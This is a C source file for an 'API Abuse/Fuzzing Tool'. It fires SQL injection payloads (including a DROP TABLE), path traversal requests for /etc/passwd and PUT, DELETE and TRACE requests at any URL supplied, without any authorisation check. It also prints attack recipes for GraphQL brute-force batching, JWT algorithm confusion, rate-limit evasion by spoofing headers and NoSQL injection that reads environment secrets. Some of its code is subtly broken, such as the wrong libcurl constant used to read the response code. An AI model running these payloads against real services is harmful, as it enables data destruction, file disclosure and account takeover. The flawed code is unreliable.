#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <curl/curl.h>
#include <jansson.h>

#define MAX_URL_LENGTH 2048
#define MAX_PAYLOAD_LENGTH 1024
#define MAX_RESPONSE_SIZE 65536

typedef struct {
    char url[MAX_URL_LENGTH];
    char method[16];
    char payload[MAX_PAYLOAD_LENGTH];
    char vulnerability[128];
    char risk[16];
    char evidence[256];
    int response_code;
    double response_time;
} fuzz_result_t;

typedef struct {
    fuzz_result_t* results;
    int count;
    int capacity;
} result_list_t;

// HTTP response structure
typedef struct {
    char* data;
    size_t size;
} http_response_t;

size_t write_callback(void* contents, size_t size, size_t nmemb, http_response_t* response) {
    size_t total_size = size * nmemb;
    response->data = realloc(response->data, response->size + total_size + 1);
    
    if (response->data == NULL) {
        printf("Memory allocation failed\n");
        return 0;
    }
    
    memcpy(&(response->data[response->size]), contents, total_size);
    response->size += total_size;
    response->data[response->size] = '\0';
    
    return total_size;
}

void init_result_list(result_list_t* list) {
    list->capacity = 100;
    list->count = 0;
    list->results = malloc(list->capacity * sizeof(fuzz_result_t));
}

void add_result(result_list_t* list, const fuzz_result_t* result) {
    if (list->count >= list->capacity) {
        list->capacity *= 2;
        list->results = realloc(list->results, list->capacity * sizeof(fuzz_result_t));
    }
    list->results[list->count++] = *result;
}

void test_sql_injection(const char* url, result_list_t* results) {
    printf("Testing SQL Injection on: %s\n", url);
    
    const char* sql_payloads[] = {
        "' OR '1'='1' --",
        "' UNION SELECT 1,2,3 --",
        "'; DROP TABLE users --",
        "' OR SLEEP(5) --",
        NULL
    };
    
    CURL* curl;
    CURLcode res;
    
    curl_global_init(CURL_GLOBAL_DEFAULT);
    
    for (int i = 0; sql_payloads[i] != NULL; i++) {
        char full_url[MAX_URL_LENGTH];
        snprintf(full_url, sizeof(full_url), "%s?id=%s", url, sql_payloads[i]);
        
        http_response_t response;
        response.data = malloc(1);
        response.size = 0;
        
        curl = curl_easy_init();
        if (curl) {
            curl_easy_setopt(curl, CURLOPT_URL, full_url);
            curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
            curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
            curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L);
            curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
            
            res = curl_easy_perform(curl);
            
            if (res == CURLE_OK) {
                long response_code;
                curl_easy_getinfo(curl, CURLOPT_RESPONSE_CODE, &response_code);
                
                // Check for SQL errors
                if (strstr(response.data, "sql") != NULL || 
                    strstr(response.data, "syntax") != NULL ||
                    strstr(response.data, "mysql") != NULL) {
                    
                    fuzz_result_t result;
                    strncpy(result.url, url, sizeof(result.url));
                    strncpy(result.method, "GET", sizeof(result.method));
                    strncpy(result.payload, sql_payloads[i], sizeof(result.payload));
                    strncpy(result.vulnerability, "SQL Injection", sizeof(result.vulnerability));
                    strncpy(result.risk, "HIGH", sizeof(result.risk));
                    strncpy(result.evidence, "SQL error in response", sizeof(result.evidence));
                    result.response_code = response_code;
                    result.response_time = 0.0;
                    
                    add_result(results, &result);
                    printf("  [!] SQL Injection vulnerability found!\n");
                }
            }
            
            free(response.data);
            curl_easy_cleanup(curl);
        }
    }
    
    curl_global_cleanup();
}

void test_path_traversal(const char* url, result_list_t* results) {
    printf("Testing Path Traversal on: %s\n", url);
    
    const char* traversal_payloads[] = {
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        NULL
    };
    
    CURL* curl;
    CURLcode res;
    
    curl_global_init(CURL_GLOBAL_DEFAULT);
    
    for (int i = 0; traversal_payloads[i] != NULL; i++) {
        char full_url[MAX_URL_LENGTH];
        snprintf(full_url, sizeof(full_url), "%s?file=%s", url, traversal_payloads[i]);
        
        http_response_t response;
        response.data = malloc(1);
        response.size = 0;
        
        curl = curl_easy_init();
        if (curl) {
            curl_easy_setopt(curl, CURLOPT_URL, full_url);
            curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
            curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
            curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L);
            
            res = curl_easy_perform(curl);
            
            if (res == CURLE_OK) {
                long response_code;
                curl_easy_getinfo(curl, CURLOPT_RESPONSE_CODE, &response_code);
                
                // Check for sensitive file content
                if (strstr(response.data, "root:") != NULL || 
                    strstr(response.data, "administrator:") != NULL) {
                    
                    fuzz_result_t result;
                    strncpy(result.url, url, sizeof(result.url));
                    strncpy(result.method, "GET", sizeof(result.method));
                    strncpy(result.payload, traversal_payloads[i], sizeof(result.payload));
                    strncpy(result.vulnerability, "Path Traversal", sizeof(result.vulnerability));
                    strncpy(result.risk, "HIGH", sizeof(result.risk));
                    strncpy(result.evidence, "Sensitive file content in response", sizeof(result.evidence));
                    result.response_code = response_code;
                    result.response_time = 0.0;
                    
                    add_result(results, &result);
                    printf("  [!] Path Traversal vulnerability found!\n");
                }
            }
            
            free(response.data);
            curl_easy_cleanup(curl);
        }
    }
    
    curl_global_cleanup();
}

void test_http_methods(const char* url, result_list_t* results) {
    printf("Testing HTTP Methods on: %s\n", url);
    
    const char* methods[] = {
        "GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS", "TRACE", NULL
    };
    
    CURL* curl;
    CURLcode res;
    
    curl_global_init(CURL_GLOBAL_DEFAULT);
    
    for (int i = 0; methods[i] != NULL; i++) {
        http_response_t response;
        response.data = malloc(1);
        response.size = 0;
        
        curl = curl_easy_init();
        if (curl) {
            curl_easy_setopt(curl, CURLOPT_URL, url);
            curl_easy_setopt(curl, CURLOPT_CUSTOMREQUEST, methods[i]);
            curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
            curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
            curl_easy_setopt(curl, CURLOPT_TIMEOUT, 5L);
            
            res = curl_easy_perform(curl);
            
            if (res == CURLE_OK) {
                long response_code;
                curl_easy_getinfo(curl, CURLOPT_RESPONSE_CODE, &response_code);
                
                // Check for dangerous methods that are allowed
                if ((strcmp(methods[i], "PUT") == 0 || 
                     strcmp(methods[i], "DELETE") == 0 ||
                     strcmp(methods[i], "TRACE") == 0) &&
                    response_code != 405 && response_code != 403) {
                    
                    fuzz_result_t result;
                    strncpy(result.url, url, sizeof(result.url));
                    strncpy(result.method, methods[i], sizeof(result.method));
                    strncpy(result.payload, "HTTP Method Test", sizeof(result.payload));
                    strncpy(result.vulnerability, "Dangerous HTTP Method Enabled", sizeof(result.vulnerability));
                    strncpy(result.risk, "MEDIUM", sizeof(result.risk));
                    snprintf(result.evidence, sizeof(result.evidence), 
                            "Method %s returns %ld", methods[i], response_code);
                    result.response_code = response_code;
                    result.response_time = 0.0;
                    
                    add_result(results, &result);
                    printf("  [!] Dangerous method %s enabled\n", methods[i]);
                }
            }
            
            free(response.data);
            curl_easy_cleanup(curl);
        }
    }
    
    curl_global_cleanup();
}

void generate_report(result_list_t* results) {
    printf("\n=== API FUZZING REPORT ===\n");
    printf("Total vulnerabilities found: %d\n\n", results->count);
    
    for (int i = 0; i < results->count; i++) {
        fuzz_result_t* result = &results->results[i];
        
        printf("Vulnerability #%d:\n", i + 1);
        printf("  URL: %s\n", result->url);
        printf("  Method: %s\n", result->method);
        printf("  Vulnerability: %s\n", result->vulnerability);
        printf("  Risk: %s\n", result->risk);
        printf("  Payload: %s\n", result->payload);
        printf("  Evidence: %s\n", result->evidence);
        printf("  Response Code: %d\n", result->response_code);
        printf("  --------------------\n");
    }
}

void demonstrate_advanced_attacks() {
    printf("\n=== ADVANCED API ATTACK TECHNIQUES ===\n");
    
    printf("\n1. GraphQL Introspection Attack:\n");
    printf("   curl -X POST -H \"Content-Type: application/json\" \\\n");
    printf("   -d '{\"query\":\"{__schema{types{name fields{name type{name}}}}}\"}' \\\n");
    printf("   https://api.target.com/graphql\n");
    
    printf("\n2. GraphQL Batching Attack:\n");
    printf("   [\n");
    printf("     {\"query\": \"mutation { login(email: \\\"test@test.com\\\", password: \\\"test\\\") { token } }\"},\n");
    printf("     {\"query\": \"mutation { login(email: \\\"test@test.com\\\", password: \\\"test2\\\") { token } }\"},\n");
    printf("     ... 1000 more queries\n");
    printf("   ]\n");
    
    printf("\n3. JWT Algorithm Confusion:\n");
    printf("   # Change algorithm from RS256 to HS256\n");
    printf("   # Use public key as HMAC secret\n");
    
    printf("\n4. API Rate Limit Bypass:\n");
    printf("   # Rotate IP headers\n");
    printf("   X-Forwarded-For: 1.1.1.1\n");
    printf("   X-Real-IP: 2.2.2.2\n");
    printf("   X-Client-IP: 3.3.3.3\n");
    
    printf("\n5. NoSQL Injection:\n");
    printf("   {\"$where\": \"this.constructor.constructor('return process')().env\"}\n");
    printf("   {\"username\": {\"$ne\": \"invalid\"}, \"password\": {\"$ne\": \"invalid\"}}\n");
}

int main(int argc, char* argv[]) {
    if (argc != 2) {
        printf("Usage: %s <base_url>\n", argv[0]);
        printf("Example: %s https://api.example.com\n", argv[0]);
        return 1;
    }
    
    printf("API Abuse/Fuzzing Tool - C Edition\n");
    printf("==================================\n");
    
    result_list_t results;
    init_result_list(&results);
    
    // Common API endpoints to test
    const char* endpoints[] = {
        "/api/users",
        "/api/products", 
        "/api/orders",
        "/api/auth",
        "/api/admin",
        "/graphql",
        "/rest/users",
        NULL
    };
    
    for (int i = 0; endpoints[i] != NULL; i++) {
        char full_url[MAX_URL_LENGTH];
        snprintf(full_url, sizeof(full_url), "%s%s", argv[1], endpoints[i]);
        
        printf("\nTesting endpoint: %s\n", full_url);
        
        test_sql_injection(full_url, &results);
        test_path_traversal(full_url, &results);
        test_http_methods(full_url, &results);
    }
    
    generate_report(&results);
    demonstrate_advanced_attacks();
    
    free(results.results);
    
    return 0;
}
